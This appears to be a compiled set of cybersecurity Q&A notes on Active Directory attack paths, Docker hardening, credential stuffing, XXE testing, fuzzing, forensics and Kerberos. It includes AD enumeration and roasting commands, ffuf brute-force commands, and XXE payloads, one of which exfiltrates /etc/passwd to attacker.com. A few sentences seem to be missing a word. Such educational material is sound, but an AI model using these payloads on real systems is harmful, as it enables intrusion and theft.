Active Directory enumeration: gather information about AD environment to plan attack path. Initial access: from domain user account (low privilege -- even help desk): BloodHound / SharpHound: most valuable AD enumeration tool; maps relationships between users, groups, computers, GPOs, OUs; finds attack paths to Domain Admin; SharpHound.exe --CollectionMethods All (collect data from domain); import zip into BloodHound GUI (neo4j graph database); query: Shortest Path to Domain Admins; Find Principals with DCSync Rights; Kerberoastable Users; etc. Manual enumeration: PowerShell AD module (if RSAT installed): Get-ADUser -Filter * -Properties * (all users with all properties); Get-ADComputer -Filter * -Properties * (all computers); Get-ADGroupMember Domain Admins (list DA members); net commands: net user /domain, net group /domain, net group Domain Admins /domain; LDAP queries: ldapsearch -H ldap://DC -b DC=corp,DC=com (anonymous LDAP if allowed); nltest /dclist:corp.com (list DCs). Impacket tools (from Linux): GetADUsers.py, GetUserSPNs.py (kerberoastable SPNs), GetNPUsers.py (AS-REP roastable -- accounts with no preauthentication); ldapdomaindump: HTML reports of domain structure from LDAP. Critical things to enumerate: Domain Admins, Enterprise Admins, Schema Admins members; Service accounts (potential Kerberoast targets); Computers (where are DCs? What OS versions? Where are high-value servers?); Trusts: nltest /domain_trusts (trust relationships with other domains/forests -- potential lateral movement paths); GPO settings: Group Policy Objects may reveal password policies, script deployment, software installation, security configurations; OUs: organisational structure; delegation: what non-admin users have admin rights on OUs?; ACLs: GenericAll, WriteDACL, WriteOwner, ForceChangePassword on sensitive objects = privilege escalation paths; BloodHound shows these graphically. AS-REP Roasting: accounts with UF_DONT_REQUIRE_PREAUTH flag; GetNPUsers.py can request TGT hash without authentication; crack offline with Hashcat mode 18200 (Kerberos 5 AS-REP); weaker passwords crackable.
What is containerisation security and how do you secure Docker?

Docker security hardening: securing the container runtime, images, and deployment configuration. Image security: use minimal base images (Alpine, distroless, scratch); smaller attack surface; fewer packages to patch; official images (Docker Hub Official, Verified Publisher) preferred over random community images; scan images before deployment: Trivy (docker run aquasec/trivy image nginx:latest); Snyk Container; Grype; scan in CI/CD pipeline; block deployment if Critical/High severity unfixed vulnerabilities; do not use latest tag (unpredictable; use specific version: nginx:1.25.3); do not store secrets in images: environment variables better (still not ideal -- use secrets manager); no secrets in Dockerfile ENV, ARG, COPY of credential files. Container runtime security: run as non-root user: USER 1000 in Dockerfile; --user 1000:1000 at runtime; read-only filesystem: --read-only (mount tmpfs for writable paths: --tmpfs /tmp); drop all capabilities, add only needed: --cap-drop ALL --cap-add NET_BIND_SERVICE; no privileged mode: never --privileged in production; resource limits: --memory 512m --cpus 1.0 (prevent DoS from container consuming all host resources); no new privileges: --security-opt no-new-privileges (prevent SUID programs escalating); seccomp profile: restricts allowed syscalls; default Docker seccomp profile blocks 44 dangerous syscalls; custom profiles more restrictive. Daemon security: Docker daemon access = root on host; never expose Docker socket to containers unless explicitly needed (and never to untrusted workloads); TLS for Docker daemon if remote access needed; Docker rootless mode: Docker daemon runs as non-root user; reduce blast radius if daemon compromised. Runtime scanning: Falco (open source, CNCF): detects runtime anomalies; alert on: exec into running container, unexpected network connection, sensitive file access, shell spawned in container. Registry security: private registry for internal images; authentication required; image signing (Docker Content Trust / Cosign + Sigstore); policy enforcement on signed images (Connaisseur, Kyverno ImagePolicy). Kubernetes applies same principles with additional controls (Pod Security Standards, NetworkPolicy, RBAC).
What is credential stuffing and how do you detect it?

Credential stuffing: automated attack using credential pairs (username:password) stolen from other data breaches; attackers rely on password reuse; one breach credentials used to attack many unrelated sites. Scale: Have I Been Pwned database: 12+ billion compromised credentials; Collections #1-5 (2019): 26 billion records; breach forums: RaidForums, BreachForums trade credential databases freely; attackers buy or download massive credential dumps; automated tools test credentials at scale. Tools used by attackers: OpenBullet (customisable stuffing tool with config files per target site); Sentry MBA; Silvabullet; custom Python scripts with threading; residential proxy networks (evade IP-based blocking; each thread uses different IP from residential ISP range = looks like real users; Oxylabs, Bright Data proxy networks). How it differs from brute force: brute force: try all password combinations; credential stuffing: try known username/password pairs from other breaches; much higher success rate against reused passwords. Success rates: 0.1-3% of tested credentials succeed (100M credentials = 100,000-3,000,000 account takeovers); highly profitable especially against financial and ecommerce sites. Detection: anomaly indicators: high volume of login failures (absolute count or ratio to successes); login attempts from many different IPs to same accounts (distributed attack); login attempts from unusual geographies; user-agent strings: identical or sequential/simple UAs from different IPs (bot pattern); credential validation queries to database increasing dramatically; multiple accounts accessed from same IP; many failed attempts with valid usernames (username enumeration phase preceding stuffing). Controls: MFA (blocks even correct credential); CAPTCHA (but advanced bots solve CAPTCHAs); rate limiting per IP, per account, per fingerprint; device fingerprinting (bot fingerprints differ from human browsers); credential check against HaveIBeenPwned API (reject passwords from breach databases); bot management platforms (Cloudflare Bot Management, Akamai Bot Manager, DataDome, PerimeterX): ML-based bot detection (mouse movement analysis, request timing, TLS fingerprinting -- JA3/JA4). Notification: notify users whose accounts had unusual activity; notify users when password found in breach database; support account recovery.
What is software-defined networking (SDN) security?

SDN security: security implications and controls for software-defined networking; separated control plane and data plane. SDN architecture: Control plane: SDN controller (OpenFlow, ONOS, OpenDaylight): centralised intelligence; makes routing decisions for all switches; Data plane: programmable switches: execute decisions from controller; communicate via southbound API (OpenFlow protocol); Northbound API: controller exposes API to applications and management. Security implications: controller is single point of failure and single point of compromise; controller compromise = control entire network; controller hardening critical; southbound API security: OpenFlow between switch and controller must be authenticated and encrypted (TLS); without TLS: attacker on same network can impersonate controller to switches or impersonate switches to controller; northbound API: REST API of controller often exposed; unauthenticated or weakly authenticated northbound API = attacker programs all network flows; isolation: controller should be on separate management network; no production traffic reaches controller directly; control plane attacks: DoS against controller; flood switch flow table (TCAM table overflow); man-in-the-middle between switch and controller. New attack surface: network topology spoofing (attacker spoofs link discovery messages -- LLDP/OpenFlow -- to create phantom links; poison controller topology view); host location poisoning (ARP spoofing to make controller route traffic incorrectly). Microsegmentation via SDN: SDN enables fine-grained flow rules; implement microsegmentation at scale (define per-workload flow rules from central controller); VMware NSX: SDN for data centre; per-VM security groups and firewall rules programmed centrally; rapid policy deployment. Security controls: mutual authentication between controller and switches (TLS client certificates); controller HA (active-standby) for availability; northbound API authentication (OAuth, API keys); RBAC on northbound API (read vs write access); audit logging of all flow rule changes; separate control plane network; controller security hardening (minimal OS, patch regularly); network telemetry from SDN controller (complete flow visibility for security analytics).
How do attackers leverage Active Directory ACLs for privilege escalation?

AD ACL (Access Control List) abuse: misconfigured AD object permissions enable privilege escalation without exploiting software vulnerabilities. AD ACLs: every AD object (user, computer, group, GPO, OU) has security descriptor with DACL (Discretionary ACL); defines who can perform what actions on object; normal admins set these; misconfigurations common and persistent. Dangerous ACEs (Access Control Entries): GenericAll: full control over object (modify attributes, reset password, add to group); GenericWrite: write any attribute; WriteDACL: modify object DACL (add new ACEs, grant self GenericAll); WriteOwner: take ownership of object (owner can modify DACL); ForceChangePassword: change password without knowing current; AddMember: add members to group; AllExtendedRights: all extended rights including force-change-password; Self: write to self; Owns: object owner. Attack paths: UserA has GenericAll on AdminUser: UserA resets AdminUser password; logs in as AdminUser; UserA has WriteDACL on Domain Admins group: UserA grants itself AddMember right; adds self to Domain Admins; UserA has WriteOwner on high-value object: UserA takes ownership; modifies DACL to grant full control; UserA has GenericAll on computer object: resource-based constrained delegation attack (RBCD): set msDS-AllowedToActOnBehalfOfOtherIdentity; gain Kerberos TGS impersonating domain admin to that computer. Finding ACL misconfigurations: BloodHound: queries all ACEs; builds graph of abuse paths; Find Shortest Path to Domain Admins via ACL edges; PowerView: Get-ObjectAcl -SamAccountName TargetObject -ResolveGUIDs; ldapsearch: read nTSecurityDescriptor; Impacket dacledit.py. Exploitation tools: PowerView: Set-DomainUserPassword, Add-DomainGroupMember; Impacket: rbcd.py for delegation abuse; Certipy (certificate template ACL abuse). Defence: BloodHound regular runs to identify attack paths; AD ACL auditing: collect and baseline ACLs; alert on changes (Event 5136 -- AD object modified, including DACL changes); remove unnecessary ACEs; privileged access workstations (PAWs) for admin account access; Tier model (prevent admin credential exposure on non-admin systems); Protected Users group; ACL analysis tools: PingCastle, Purple Knight, ADExplorer.
What is network forensics and how do you analyse PCAP files?

Network forensics: capture and analysis of network traffic for security investigation; reconstruct attack events from packets. Capture tools: Wireshark (GUI, best for manual analysis); tcpdump (command line: tcpdump -i eth0 -w capture.pcap); tshark (CLI Wireshark); Zeek (automated log generation from PCAP); NetworkMiner (passive network sniffer, extracts files and credentials from PCAP). Wireshark analysis workflow: open PCAP; Statistics > Conversations (see all host pairs with traffic volumes; identify top talkers); Statistics > Protocol Hierarchy (protocol distribution; unusual protocols?); Statistics > IO Graph (traffic over time; identify spikes indicating scanning or exfiltration); Follow TCP/UDP Stream (reconstruct full session; see HTTP requests, credentials, file transfers). Filters: ip.addr == 192.168.1.100 (filter by IP); tcp.port == 443 (filter by port); http.request (all HTTP requests); dns (all DNS traffic); frame contains password (search for string in all packets); tls.handshake.type == 1 (TLS ClientHello -- see all HTTPS connections even if encrypted). Command line with tshark: tshark -r capture.pcap -Y dns -T fields -e dns.qry.name (extract DNS queries); tshark -r capture.pcap -Y http.request -T fields -e ip.src -e http.host -e http.request.uri (HTTP request URIs); tshark -r capture.pcap -Y ftp.request.command (FTP commands including credentials). Extracting files: Wireshark: File > Export Objects > HTTP (extract all files from HTTP responses); or NetworkMiner (automatically extracts files, images, credentials from PCAP). Zeek log analysis: zeek -r capture.pcap; produces: conn.log (all connections), http.log (HTTP requests), dns.log (DNS queries), ssl.log (TLS connections), files.log (extracted file metadata), notice.log (Zeek-generated alerts); analyse with grep or rita (Real Intelligence Threat Analytics). Identifying attacks from PCAP: port scan: many connections to different ports from single source; brute force: many TCP connections to same port (SSH:22, RDP:3389) with small data exchange (failed login); C2 beaconing: regular interval connections to same external IP; DNS tunneling: high volume of DNS queries with long subdomains to single domain; data exfiltration: large outbound data transfer at unusual time; SQL injection: HTTP requests containing UNION SELECT, FROM information_schema in URI or body.
What is the dark web and what security relevance does it have?

Dark web: part of internet accessible only through anonymisation networks (primarily Tor); not indexed by search engines; distinct from deep web (requires authentication but not special software). Tor (The Onion Router): network of volunteer-operated relays; traffic encrypted and routed through 3+ nodes; exit node communicates with destination; source IP hidden from destination;.onion domains: accessible only via Tor; self-authenticating hidden services (address = public key hash). Dark web ecosystem from security perspective: Threat intelligence value: criminal forums (BreachForums, RaidForums before seizure, XSS, Exploit.in): discuss attack techniques, sell tools, post stolen data; monitoring reveals: new data breaches (credential dumps, PII), tools being developed or sold (new malware, exploits for sale), attacker TTPs and target planning, whether your organisation is specifically targeted. Ransomware leak sites: ransomware groups post victim data if ransom not paid; accessible via Tor; monitoring identifies whether your data is posted; groups: LockBit, ALPHV/BlackCat, Clop, Play -- all operated leak sites; dark web scraping services monitor for your organisation name. Credential and data markets: Genesis Market (seized 2023): sold browser fingerprints and session cookies; 2easy, Russian Market: sell logs from info-stealers (browser credentials, cookies, saved passwords); monitoring for your domain credentials. Access brokers: sell initial access to compromised organisations (RDP access, VPN credentials, web shell); buyer uses for ransomware deployment; monitoring for your organisation for sale. Monitoring services: commercial dark web monitoring (Recorded Future, Flashpoint, Cybersixgill, DarkOwl): continuously monitor dark web for your keywords (domain name, executive names, product names, credential format); alert when found. Law enforcement: Tor is legal in most countries; dark web not inherently illegal; illegal content (CSAM, drug markets, fraud) is illegal; FBI, Europol, NCA regularly disrupt dark web markets; seized infrastructure reveals participants; operational security mistakes reveal identities (Silk Road: Ross Ulbricht identified via email; AlphaBay: Alexandre Cazes identified via email). OpSec on dark web: even Tor users make mistakes; language, writing style, operational patterns allow attribution.
How do you test for XML external entity (XXE) vulnerabilities?

XXE (XML External Entity injection): attacker injects malicious XML that references external entities; server parses XML and retrieves external content. How it works: XML supports external entities: XML declaration: DOCTYPE foo [<!ENTITY xxe SYSTEM file:///etc/passwd>]; entity reference in document: &xxe;; vulnerable parser resolves entity and includes file content; if application returns entity value in response: content of /etc/passwd returned. Detection: any endpoint accepting XML input potentially vulnerable; XML: SOAP web services, REST APIs with Content-Type: application/xml, SVG upload (SVG is XML), DOCX/XLSX file upload (Office formats are XML in ZIP), XML-based config import. Testing: replace valid XML body with XXE payload: POST /api/items HTTP/1.1; Content-Type: application/xml; Body: add DOCTYPE declaration with external entity; include entity reference in element; observe response for file content. Payloads: basic file read: DOCTYPE foo [<!ENTITY xxe SYSTEM file:///etc/passwd>]; XML: <foo>&xxe;</foo>; Windows: file:///C:/Windows/win.ini; SSRF via HTTP: DOCTYPE foo [<!ENTITY xxe SYSTEM http://attacker.com/xxe>]; SSRF reveals internal services via HTTP request from server. Blind XXE (no output in response): out-of-band exfiltration: DOCTYPE foo [<!ENTITY % file SYSTEM file:///etc/passwd> <!ENTITY % eval <!ENTITY % exfil SYSTEM http://attacker.com/?data=%file;>> %eval; %exfil;]; server resolves entities and makes HTTP request to attacker with file content. Error-based blind XXE: trigger XML parser error that includes file content in error message (not all parsers support this). Impact: local file read (configuration files with credentials, /etc/passwd, SSH keys); SSRF (reach internal services, AWS metadata); DoS (Billion Laughs attack: exponentially expanding entities exhaust memory). Mitigation: disable XML external entity processing: Java (SAXParserFactory.setFeature(http://xml.org/sax/features/external-general-entities, false)); Python (lxml: resolve_entities=False); PHP (libxml_disable_entity_loader(true) -- PHP < 8.0); use JSON APIs instead of XML where possible; input validation (strip DOCTYPE if not needed); OWASP XXE prevention cheat sheet has language-specific mitigations.
What is digital rights management (DRM) and its security aspects?

DRM (Digital Rights Management): technology to control use and distribution of digital content; restricts copying, printing, sharing, time-limited access. Use cases: streaming video (Netflix, Disney+): prevent screen recording and download; music (Spotify, Apple Music): prevent download and permanent copy; ebooks (Kindle, Adobe Digital Editions): prevent sharing and copying; software licensing: prevent unauthorised installation; enterprise documents (Microsoft Azure Rights Management, Adobe Acrobat Rights Management): control document access and editing. How DRM works: content encrypted with content key; content key encrypted with rights management server key; player software authorised by rights server receives content key; player decodes content; without authorisation: content unreadable; HDCP (High-bandwidth Digital Content Protection): encrypts signal between device and display (HDMI, DisplayPort); prevents capture at display level. Widevine (Google): DRM used by Netflix, Amazon, YouTube; three security levels: L1 (hardware-based, most secure, required for 4K), L2, L3 (software-based, easily bypassed); FairPlay (Apple): iOS/macOS/Safari exclusive; PlayReady (Microsoft). Circumvention: screen capture (user-mode screen grabber: often blocked by DRM at OS level via DRM-protected buffers; hardware capture card captures HDMI signal after DRM decoded; analogue hole: camera records screen); Widevine L3 bypass: software-based L3 DRM reversed; content key extractable with Frida hooking; Widevine L1 requires hardware TEE (Trusted Execution Environment) to protect keys; software-based tools (RVT -- Raw Video Tools) decrypt streams. Trusted Execution Environment (TEE): ARM TrustZone, Intel SGX, AMD SME: isolate security-sensitive code from OS; DRM operations inside TEE: OS compromise cannot extract content key; SGX previously used by Widevine; Intel SGX deprecated by Intel 2022. Legal aspects: DMCA Section 1201 (US): circumventing DRM protection illegal even (making personal backup of purchased disc); EU Copyright Directive similar provisions; researchers received DMCA exemptions for security research; security researchers must navigate carefully.
How does cloud identity federation work?

Cloud identity federation: allow users to authenticate with existing identity provider (IdP) rather than separate cloud credentials; single sign-on for cloud services. Protocols: SAML 2.0 (Security Assertion Markup Language): XML-based; enterprise standard; IdP (Okta, AD FS, Ping Identity, Azure AD) issues XML assertions; SP (Service Provider) validates assertion; browser redirects carry assertions; stateless; used for enterprise SSO to web apps. OIDC (OpenID Connect): JSON/JWT based; OAuth 2.0 extension; modern; preferred for APIs and mobile; IdP issues ID token (JWT) to app after authentication; app validates JWT signature and claims; used by Google, Microsoft, Okta. OAuth 2.0: authorisation (not authentication by itself); app gets access token to call APIs on user behalf; scopes limit access; combined with OIDC for both authentication and authorisation. Federation flow (SAML): user attempts to access SP (app); SP redirects to IdP with SAML request; user authenticates at IdP (with MFA); IdP issues signed SAML assertion (contains user attributes, group memberships, validity period); user browser POSTs assertion to SP; SP validates signature using IdP certificate; SP creates session; user authenticated. AWS federation: IAM Identity Center (formerly SSO): federate with any SAML/OIDC IdP; role mapping (AD group = AWS IAM role); temporary credentials via STS AssumeRoleWithSAML or AssumeRoleWithWebIdentity; CLI access: aws configure sso; no long-lived access keys needed. Azure AD B2B: federate with external Azure AD tenants or IdPs; guest accounts; cross-organisation collaboration. Workload identity federation: allow workload (GitHub Actions, GCP workload, Azure managed identity) to assume cloud role without static secrets; GitHub Actions OIDC: GitHub issues JWT; AWS STS validates JWT signature using GitHub JWKS endpoint; exchanges for temporary AWS credentials; no stored secrets in GitHub; Google Workload Identity Federation similarly. Security considerations: IdP compromise = all federated SP compromised; MFA must be enforced at IdP level (not SP); validate assertion signatures and certificate; check assertion validity period; prevent assertion replay; SAML signature wrapping attacks; JSON injection in OIDC claims.
What is hacking and how do you get started?

hacker: authorised simulation of real-world attacks to identify security weaknesses; same techniques as malicious hackers but and for defensive purpose. Role titles: Penetration Tester (pentester): primary role; conducts authorised tests; red teamer: simulates advanced persistent threat; more long-term and realistic engagement; security researcher: finds vulnerabilities in systems or software; bug bounty hunter: participates in bug bounty programs; offensive security engineer: builds and maintains offensive tools and capabilities. Skills needed: networking: TCP/IP, protocols, firewalls, VPN, DNS; operating systems: Linux (Kali, Parrot OS) and Windows administration; scripting: Python, Bash, PowerShell; web application: HTTP, HTML, JavaScript, SQL; specific vulnerability knowledge (OWASP Top 10, CVE research); tools: Nmap, Burp Suite, Metasploit, Wireshark, Hashcat. Learning path: free: Hack The Box (HTB): gamified hacking challenges; active and retired machines; guided paths; TryHackMe: guided learning rooms from beginner to advanced; PentesterLab: web application focused; VulnHub: downloadable vulnerable VMs; HackTheBox Academy: structured curriculum; PortSwigger Web Security Academy: excellent free web security labs (all OWASP topics with hands-on labs). Paid courses: Offensive Security PEN-200 (OSCP): most respected; INE PTS (eJPT): entry level; TCM Security (practical focused, affordable). Build home lab: VirtualBox or VMware; Metasploitable (intentionally vulnerable Linux); DVWA (Damn Vulnerable Web Application); Windows Server evaluation (free 180 days); Practice escalating complexity. Certifications: OSCP (most valued by employers); CEH (Certified hacker: more theoretical; less respected technically but widely recognised in job postings); CompTIA Security+ (good foundation; not offensive focused); GPEN, GWAPT (SANS GIAC: expensive but respected); eJPT (entry level; good start). Legal: always have written permission before testing any system; bug bounty programs provide legal safe harbour within scope; never test without explicit authorisation; even testing your own systems on shared hosting violates ToS. Career: pentesting roles: junior: $70-90K; mid: $90-130K; senior: $130-180K+; specialisations (cloud pentesting, ICS/OT, hardware, mobile, reverse engineering) command premium.
How do you investigate a phishing email?

Phishing email investigation: determine malicious intent, extract IoCs, protect organisation. Header analysis: open raw email headers (Gmail: Show Original; Outlook: View > All Headers); key headers: From (display name and email address): check if display name says CEO but email is randomdomain.com; Reply-To: if different from From -- suspicious; Return-Path: where bounces go; usually different from From in phishing; Received: trace path of email through mail servers (first Received = closest to recipient); X-Originating-IP or X-Sender-IP: original sender IP. Authentication headers: Authentication-Results: shows SPF, DKIM, DMARC results; fail on all three = highly suspicious; pass on SPF but fail DMARC alignment = sophisticated spoofing. URL analysis: extract all links; do not click directly; safe analysis: VirusTotal URL scanner; URLScan.io (render and screenshot page without visiting); urlhaus.abuse.ch; manually defang URLs by replacing. with [.] (https[://]malicious[.]com); check domain age: WHOIS (newly registered domains common in phishing); check domain reputation (Talos, URLHaus). Attachment analysis: if present: extract in sandbox (don't open on live system); ANY.RUN, Hybrid Analysis, Cuckoo sandbox; hash the file (sha256sum): check VirusTotal; strings analysis for URLs, C2, hardcoded values; file type: check magic bytes not just extension (doc.exe is executable regardless of icon); macro-enabled Office: extract macros with oledump.py or oletools. IOC extraction: sender IP, sending domain, URLs, attachment hash, embedded domains in document, email subject line (correlate with threat intelligence). Response actions: delete from all mailboxes (Office 365: New-ComplianceSearch / Start-ComplianceSearchAction -Purge; Google Workspace: GAM tool); block sender domain/IP in email gateway; add URLs to web proxy blocklist; add file hash to EDR blacklist; notify affected users. If user clicked: run EDR scan on user machine; check for persistence; reset credentials; check for lateral movement. Threat intelligence: run all IoCs through TIP; check if known phishing campaign; if novel campaign: share with ISAC; report to PhishTank, Anti-Phishing Working Group (APWG).
What is the difference between symmetric and asymmetric cryptography?

Symmetric vs Asymmetric cryptography: two fundamental paradigms with different properties and use cases. Symmetric cryptography: same key used for encryption and decryption; sender and receiver must share secret key securely beforehand; efficient (fast, low CPU); suitable for large data volumes; key distribution problem (how do parties share key securely over untrusted channel?); examples: AES (most widely used symmetric cipher), 3DES (legacy, deprecated), ChaCha20 (used in TLS 1.3, mobile -- software-efficient), DES (legacy, broken). Asymmetric (public-key) cryptography: key pair: public key (shared openly) and private key (kept secret); mathematically related; what one key encrypts, the other decrypts; encrypt with public key: only private key decrypts; sign with private key: public key verifies signature; examples: RSA (integer factorisation hardness), ECC (Elliptic Curve Cryptography -- discrete log on EC; smaller keys for equivalent security; P-256, P-384, Curve25519), DH/ECDH (Diffie-Hellman key exchange); slower than symmetric (100-1000x); key distribution solved (public key can be shared openly); does not require prior secret exchange. How they combine: hybrid encryption: use asymmetric to securely exchange symmetric key; then use symmetric for bulk data encryption; TLS: ECDHE (asymmetric) establishes session key; AES-GCM (symmetric) encrypts data; RSA/ECDSA signature verifies certificate; S/MIME: AES encrypts email body; RSA/ECC encrypts AES key with recipient public key; PGP same hybrid approach. Key sizes comparison: RSA 2048-bit equivalent security to ECC 256-bit (P-256) equivalent to AES 128-bit; RSA 3072 = ECC 256 (NIST) = AES 128; RSA 4096 = ECC 384 = AES 192; RSA 15360 = ECC 512 = AES 256 (quantum-safe level). Post-quantum cryptography: current asymmetric algorithms (RSA, ECC, DH) broken by Shor algorithm on quantum computer; symmetric (AES) halved in security by Grover algorithm (AES-256 becomes equivalent to AES-128); NIST post-quantum standards (2024): CRYSTALS-Kyber (ML-KEM) for key encapsulation, CRYSTALS-Dilithium (ML-DSA) for signatures; migration planning needed now for long-lived secrets and infrastructure.
How do you perform web application fuzzing?

Web application fuzzing: automated generation of unexpected inputs to discover crashes, errors, and security vulnerabilities. Types: Dumb fuzzing: random input without understanding format; mutate valid inputs randomly; faster to set up; misses logic-aware issues; Smart/grammar-based: generate inputs conforming to expected format; more efficient at reaching deep code paths; application-aware. Tools: ffuf (Fast Fuzzer): Golang; extremely fast; HTTP fuzzing; multi-wordlist; filter responses; ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302 (directory brute force); ffuf -u http://target.com/page -d param=FUZZ -w payloads.txt (parameter fuzzing); wfuzz: older Python tool; similar to ffuf; Burp Intruder: GUI-based; slower but integrated with proxy; Burp Turbo Intruder: faster Burp extension for race conditions and high-speed attacks; radamsa: mutation fuzzer; mutates valid sample inputs; AFL++ (American Fuzzy Lop): coverage-guided binary fuzzer; modifies inputs to increase code coverage; most powerful for compiled binaries; LibFuzzer: in-process fuzzer for libraries; guided by sanitisers. Wordlists for web fuzzing: SecLists (Daniel Miessler): comprehensive collection; directories (Discovery/Web-Content/), usernames, passwords, parameters, extensions, subdomains; raft-large-files.txt, raft-medium-directories.txt commonly used. Directory and file discovery: ffuf -u http://target.com/FUZZ -w raft-medium-directories.txt -mc 200,204,301,302,307,401,403; look for unexpected directories (admin, backup, old, dev, test, api, upload). Parameter fuzzing: ffuf -u http://target.com/page?FUZZ=test -w burp-parameter-names.txt (discover hidden parameters); useful for finding SSRF, LFI, RFI, injection parameters not documented. Extension fuzzing: ffuf -u http://target.com/page.FUZZ -w extensions.txt (find backup files: page.bak, page.old, page~, page.swp). Subdomain fuzzing: ffuf -u http://FUZZ.target.com -w subdomains.txt -H Host: FUZZ.target.com -fc 302 (virtual hosting). API endpoint fuzzing: fuzz REST endpoints, HTTP methods, content types; discover undocumented endpoints. Corpus-based: collect all valid requests from proxy; use as mutation base; Burp: save all requests as corpus for ffuf or radamsa.
What is a honeypot versus a honeynet?

Honeypot: single decoy system designed to attract attackers; limited scope; simulates specific service or system. Honeynet: network of multiple honeypots; provides more realistic environment; attacker interacts with multiple systems; more intelligence gathered; harder for sophisticated attackers to identify as honeypot (single honeypot with no neighbours is suspicious). Honeynet architecture: multiple honeypots (simulated workstations, servers, database, domain controller); honeywall/data control layer (between honeypots and internet): allows inbound connections; restricts outbound (attacker cannot use honeypots to attack others); captures all traffic in both directions; data capture layer: full packet capture, system-level logging, keystroke capture; data analysis layer: correlate, analyse, report on captured data. Honeynet generations: first gen: static honeynets, simple capture, easy to detect; second gen: improved data control (rate limiting outbound); dynamic routing; more realistic; third gen: self-contained virtualised networks; commercial and research solutions. Research vs production: research honeynet: gather threat intelligence; study attack techniques; deployed in DMZ or at Internet exchanges; accept high interaction (actual OS, real services); Honeynet Project: non-profit deploying global research honeynets. Production honeynet: deployed inside enterprise network; detect attackers who breach perimeter; early warning system; any connection to honeypot = likely attacker (no legitimate business use); alerts = high fidelity (very low false positive rate). Distributed honeynets: GreyNoise (commercial): large honeynet distributed globally; distinguishes background internet noise from targeted scanning; data sold as threat intelligence; Shodan honeypots: researchers deploy internet-connected honeypots; study scanning and exploitation patterns. Examples: Project Honey Pot: distributed honeypots for spam trap; Spamhaus: distributed honeypots catching spambots; T-Pot: ready-to-deploy honeynet on Debian; includes 20+ honeypot services (Cowrie SSH/Telnet, Dionaea malware capture, Elasticpot, Gridpot, Heralding, etc.); Elasticsearch/Kibana dashboard. Modern evolutions: Cyber Deception platforms: enterprise-grade honeypot management; Attivo Networks (acquired by SentinelOne); Illusive Networks; TrapX; integrate with SIEM; automated response (isolate attacker source IP when honeypot touched); breadcrumbs (fake credentials left on systems that lead to honeypots when used).
What is DMARC failure analysis?

DMARC failure analysis: investigating why emails fail DMARC authentication to fix legitimate email delivery or identify spoofing. DMARC reports: DMARC aggregate reports (RUA): daily XML reports from major email providers (Google, Microsoft, Yahoo, etc.); show: total messages, SPF/DKIM/DMARC pass/fail counts, source IPs, envelope from domains; processed by DMARC analysis tools: Postmark, MXToolbox, dmarcian, Valimail, Google Postmaster Tools. Interpreting failures: SPF failure, DKIM pass, DMARC pass: DMARC uses DKIM for alignment -- OK as long as one passes with alignment; SPF pass, DKIM fail, DMARC pass: DMARC uses SPF for alignment -- OK if SPF sender domain aligns with From header domain; SPF fail, DKIM fail, DMARC fail: legitimate issue (not in SPF record, DKIM not configured) or spoofing/phishing. DMARC alignment: strict: From domain must exactly match; relaxed (default): From domain subdomain match allowed; mail.corp.com aligns with From: user@corp.com. Common failure causes for legitimate email: email service not in SPF record: add new marketing platform (Mailchimp, HubSpot, Marketo, Salesforce Pardot); update SPF TXT record to include it; SPF exceeds 10 DNS lookup limit: too many include: mechanisms; use SPF flattening tools; forwarding breaks SPF: when email forwarded, source IP changes; DKIM still passes (content unchanged); SPF fails; ARC (Authenticated Received Chain) helps; signature key rotation without updating DNS: DKIM private key changed; DNS record not updated; all outbound mail fails DKIM. Spoofing investigation: DMARC report shows unknown IPs sending email with your From domain; check if IP is known threat actor; check if it is legitimate third-party service (new vendor?); block unauthorised sending if DMARC in enforcement (p=quarantine or p=reject). Policy progression: p=none: monitor only; collect reports; fix legitimate failures; move to p=quarantine: suspicious email goes to spam; fix any remaining failures; move to p=reject: all failing email rejected; subdomain policy: sp=reject blocks spoofing of sub.corp.com while main corp.com at p=none during transition.
How does Kerberos authentication work in detail?

Kerberos: network authentication protocol using tickets; eliminates password transmission over network; Windows Active Directory primary authentication mechanism. Components: KDC (Key Distribution Center): runs on DC (Domain Controller); two services: AS (Authentication Service) and TGS (Ticket Granting Service); each user and service has long-term secret (NTLM hash derived from password); realm = Kerberos domain (Active Directory domain). Full authentication flow: (1) AS-REQ: client sends authentication request to KDC AS: username, encrypted timestamp (pre-authentication; encrypted with password hash -- proves knowledge of password without sending it). (2) AS-REP: KDC verifies timestamp; if valid: issues TGT (Ticket Granting Ticket): encrypted with krbtgt account hash (only KDC can decrypt); contains: user identity, session key, expiry (default 10 hours), PAC (Privilege Attribute Certificate: group memberships, user rights); also returns: session key encrypted with user hash. (3) TGS-REQ: client wants to access service; sends to KDC TGS: TGT + SPN (Service Principal Name) of target service + authenticator (timestamp encrypted with TGT session key). (4) TGS-REP: KDC decrypts TGT (only KDC can); validates authenticator; issues service ticket: encrypted with service account hash (only target service can decrypt); contains: user identity, PAC, new session key; returns session key encrypted with TGT session key. (5) AP-REQ: client sends service ticket to target service + authenticator encrypted with service session key. (6) AP-REP: service decrypts ticket with its own hash; validates authenticator; extracts PAC (group memberships); performs authorisation decision; optionally sends mutual authentication response. Key security properties: passwords never transmitted; tickets contain PAC (cached group memberships -- DC not consulted for every resource access); replay protection: authenticator timestamp valid only 5 minutes; KDC must be trusted and secured (krbtgt hash = golden ticket; service account hash = silver ticket).
